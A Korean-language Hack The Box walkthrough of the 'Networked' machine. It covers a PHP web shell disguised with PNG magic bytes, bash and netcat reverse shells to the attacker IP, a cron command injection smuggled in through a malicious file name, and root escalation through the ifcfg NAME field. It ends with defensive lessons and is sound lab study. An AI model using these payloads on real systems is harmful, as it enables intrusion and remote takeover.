# HTB - Networked

## 머신 정보

|항목|내용|
|---|---|
|이름|Networked|
|난이도|Easy (실제로는 Medium 수준)|
|OS|Linux (CentOS)|
|IP|10.129.191.118|
|주요 취약점|PHP 파일 업로드 우회 + Cron 명령어 인젝션|
|Privesc|ifcfg NAME 필드 코드 실행|
|태그|`FileUpload` `MagicBytes` `CronJob` `CommandInjection` `ifcfg` `Linux`|

---

## 공격 흐름 요약

```
nmap 포트 스캔
→ 80 포트 (Apache)
→ gobuster로 /backup/ 발견
→ backup.tar 다운로드 (소스코드 분석)
→ Magic Bytes로 PHP 웹쉘 업로드
→ apache 리버스쉘 획득
→ 악성 파일명으로 Cron 명령어 인젝션
→ guly 쉘 획득
→ sudo changename.sh로 root 획득
```

---

## 1. 정찰 (Reconnaissance)

### 1.1 Nmap 포트 스캔

```bash
nmap -p- --min-rate 10000 -T4 10.129.191.118
```

**결과:**

|PORT|SERVICE|
|---|---|
|22/tcp|SSH|
|80/tcp|HTTP|

### 1.2 Apache 버전 확인

```bash
nmap -sV -p 80 10.129.191.118
# 또는
curl -v http://10.129.191.118/ 2>&1 | grep -i server
```

### 1.3 디렉토리 스캔

```bash
gobuster dir -u http://10.129.191.118/ \
-w /usr/share/wordlists/dirb/common.txt
```

→ `/backup/` 디렉토리 발견

### 1.4 백업 파일 다운로드

```bash
wget http://10.129.191.118/backup/backup.tar
tar -xvf backup.tar
```

**추출된 파일:**

- `index.php`
- `lib.php`
- `photos.php`
- `upload.php`

> ⚠️ `crontab.guly`는 백업에 없음 → 쉘 획득 후 `/home/guly/`에서 확인 필요

---

## 2. 소스코드 분석

### lib.php - 허용 확장자

```php
$allowedExts = array("jpg", "jpeg", "gif", "png");
```

### lib.php - Magic Bytes 검사

파일의 실제 내용을 검사해서 이미지인지 확인.

### upload.php - 파일 저장 규칙

업로드된 파일명을 `{업로더IP}.{확장자}` 형식으로 저장:

- `10.10.17.240.php.png` 형태

---

## 3. 초기 접근 (Initial Access)

### 3.1 PHP 웹쉘 생성 (Magic Bytes 우회)

```bash
echo -e '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a<?php system($_GET["cmd"]); ?>' > shell.php.png
```

PNG Magic Bytes (`89 50 4e 47 0d 0a 1a 0a`) 를 파일 앞에 붙여서 서버가 PNG로 인식하게 함.

### 3.2 업로드

```
http://10.129.191.118/upload.php
→ shell.php.png 업로드
→ "file uploaded, refresh gallery" 확인
```

### 3.3 실제 파일명 확인

```
http://10.129.191.118/photos.php
```

→ `10_10_17_240.php.png` 로 저장됨 (`.`이 `_`로 변환)

### 3.4 웹쉘 확인

```
http://10.129.191.118/uploads/10_10_17_240.php.png?cmd=id
```

### 3.5 리버스쉘 획득

**nc 리스너:**

```bash
nc -lvnp 4444
```

**브라우저에서:**

```
http://10.129.191.118/uploads/10_10_17_240.php.png?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.17.240/4444+0>%261'
```

→ **apache 유저 쉘 연결!**

---

## 4. 트러블슈팅 - 리버스쉘 연결 안된 이유

### 문제 1: 쉘이 Non-interactive

처음 nc로 연결됐지만 명령어가 안먹힘.

**해결:** pty 업그레이드

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### 문제 2: 악성 파일명 생성 실패

`touch ';/tmp/rev.sh'` 명령이 계속 실패:

```
touch: cannot touch ';/tmp/rev.sh': No such file or directory
```

**원인:** touch가 `;/tmp/rev.sh`를 경로로 인식 (`;`는 명령어 구분자, `/tmp/rev.sh`는 디렉토리 경로로 해석)

**해결:** `/tmp/rev.sh` 경로를 사용하지 않고 **파일명 자체에 bash 명령어를 직접 넣는 방식** 사용:

```bash
touch '; nc -c bash 10.10.17.240 5555'
```

### 문제 3: nc -e vs nc -c

일반 nc 리버스쉘 (`nc -e /bin/bash`)이 안되는 경우:

```bash
# nc -e 안될 때
touch '; nc -c bash 10.10.17.240 5555'
```

---

## 5. Cron 명령어 인젝션 (apache → guly)

### check_attack.php 분석

```php
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

`$value` = 파일명이 검증 없이 `exec()`에 직접 삽입됨!

### 악성 파일명 생성

```bash
cd /var/www/html/uploads
touch '; nc -c bash 10.10.17.240 5555'
```

**파일명 구조:**

```
; nc -c bash 10.10.17.240 5555
```

→ `rm -f /var/www/html/uploads/` 뒤에 `;`로 명령어 분리 → `nc -c bash` 실행

### 5555 리스너 실행

```bash
nc -lvnp 5555
```

### 3분 대기 → guly 쉘 연결!

```bash
whoami
guly
```

---

## 6. User Flag

```bash
cat /home/guly/user.txt
```

---

## 7. 권한 상승 (Privilege Escalation)

### 7.1 sudo 권한 확인

```bash
sudo -l
```

```
(root) NOPASSWD: /usr/local/sbin/changename.sh
```

### 7.2 changename.sh 분석

```bash
cat /usr/local/sbin/changename.sh
```

```bash
#!/bin/bash -p
regexp="^[a-zA-Z0-9_\ /-]+$"
for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
    echo "interface $var:"
    read x
    while [[ ! $x =~ $regexp ]]; do
        echo "wrong input, try again"
        read x
    done
    echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
/sbin/ifup guly0
```

### 7.3 ifcfg NAME 필드 취약점

`/etc/sysconfig/network-scripts/ifcfg-*` 파일의 **NAME 필드에 공백이 있으면** 뒤의 값이 명령어로 실행되는 버그!

### 7.4 root 쉘 획득

```bash
sudo /usr/local/sbin/changename.sh
```

입력값:

```
interface NAME: test bash
interface PROXY_METHOD: test
interface BROWSER_ONLY: test
interface BOOTPROTO: test
```

→ **root 쉘 획득!**

---

## 8. Root Flag

```bash
cat /root/root.txt
```

---

## 9. 정리 및 교훈

### 취약점 체인

```
Magic Bytes 우회 → PHP 웹쉘 업로드
→ apache 쉘 획득
→ Cron 파일명 인젝션 (check_attack.php)
→ guly 쉘 획득
→ ifcfg NAME 필드 코드 실행
→ root 획득
```

### 핵심 교훈

- **파일 업로드 검증** 철저히 (확장자 + MIME + Magic Bytes 모두 검증)
- **exec() 함수에 사용자 입력 직접 사용 금지** → 명령어 인젝션
- **Cron 작업 스크립트 보안** 중요
- **ifcfg NAME 필드** 취약점 → 공백으로 명령어 실행 가능
- `sudo -l` 은 항상 첫 번째로 확인!

### PNG Magic Bytes

```
89 50 4e 47 0d 0a 1a 0a
```

### 악성 파일명 생성 핵심

```bash
# ❌ 안됨 - touch가 경로로 인식
touch ';/tmp/rev.sh'

# ✅ 됨 - 파일명에 직접 명령어 삽입
touch '; nc -c bash 10.10.17.240 5555'
```

---

## 참고

| 항목             | 링크                                                    |
| -------------- | ----------------------------------------------------- |
| ifcfg NAME 취약점 | https://seclists.org/fulldisclosure/2019/Apr/24       |
| Magic Bytes    | https://en.wikipedia.org/wiki/List_of_file_signatures |
| GTFOBins       | https://gtfobins.github.io                            |